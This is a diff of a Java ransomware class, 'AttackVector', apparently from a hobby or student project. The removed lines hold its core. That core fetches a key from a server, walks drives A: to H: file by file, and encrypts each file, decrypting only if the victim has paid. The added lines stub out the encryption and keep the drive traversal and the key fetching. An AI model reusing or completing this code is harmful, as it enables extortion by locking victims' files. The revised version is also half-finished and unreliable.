@@ -5,49 +5,38 @@ import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Map;
 
-import org.springframework.beans.factory.annotation.Value;
-
 import Agent.EncryptionAlgo.CryptoAlgorithm;
-import Agent.Utils.AlgorithmsMapUtil;
+import Agent.entites.AlgorithmsMap;
 import Agent.entites.CryptoKey;
 import Agent.exceptions.RansomwareException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
+import kotlin.jvm.functions.Function3;
 
 public class AttackVector {
-	@Value("${server.url.get}")
-	private String urlgetKey;
-	@Value("${server.url.buy}")
-	private String urlboughtKey;
 
 	public void cryptFileSystem(boolean isPaid) throws RansomwareException {
 
-		Traverse dfs = new DFS();
-		Traverse bfs = new BFS(); 
+		Traverse<File> dfs = new DFS<File>();
+		Traverse<File> bfs = new BFS<File>(); 
 
 		CryptoKey key;
 		KeyService keyService = new KeyService();
-		if (isPaid) {
-			key = keyService.getKey(urlboughtKey);
-		} else {
-			key = keyService.getKey(urlgetKey);
-		}
-
+		key = keyService.getKey();
+			//or
+		key = keyService.buykey();
 		Collection<File> visitedFolders = new ArrayList<File>();
 
 		for (char i = 'A'; i <= 'H'; i++) {
-			try {
-				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, isPaid);
-				// or
-				traverseAndCrypt(i + ":\\", visitedFolders, key, dfs, isPaid);
-			} catch (RansomwareException e) {
-				throw new RansomwareException("failed crypting the whole file system - ransom exception", e.getCause());
-			}
 
+			traverseAndCrypt(i + ":\\", visitedFolders, key, bfs);
+			// or
+			traverseAndCrypt(i + ":\\", visitedFolders, key, dfs);
 		}
+
 	}
 
-	private Object getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
+	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
 		return algorithmMap.get(className);
 	}
 
@@ -57,13 +46,14 @@ public class AttackVector {
 		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
 	}
 
-	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse struct,
-			boolean isPaid) throws RansomwareException {
+	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct) {
+
+		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
 
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
 			/* get next file/directory */
-			File current = struct.remove();
+			File current = (File) struct.remove();
 
 			File[] fileDirList = current.listFiles();
 
@@ -78,25 +68,14 @@ public class AttackVector {
 
 					} else if (file.isFile()) {
 
-						try {
-							CryptoAlgorithm crypto = (CryptoAlgorithm) getCryptClass(AlgorithmsMapUtil.getMap(),
-									key.getAlgorithm());
-
-							// if there is payment - the function decrypts the file system
-							// Else - encrypts it
-							if (isPaid) {
-								crypto.decrypt(key.getKey(), file);
-							} else {
-								crypto.encrypt(key.getKey(), file);
-
-							}
-						} catch (RansomwareException e) {
-							throw new RansomwareException(e.getCause());
-						}
+						//  Still has no clue what to do 
+						// with the encrypt/decrypt thing
+						
+						
 					}
 				}
-
 			}
+
 		}
 	}
 }
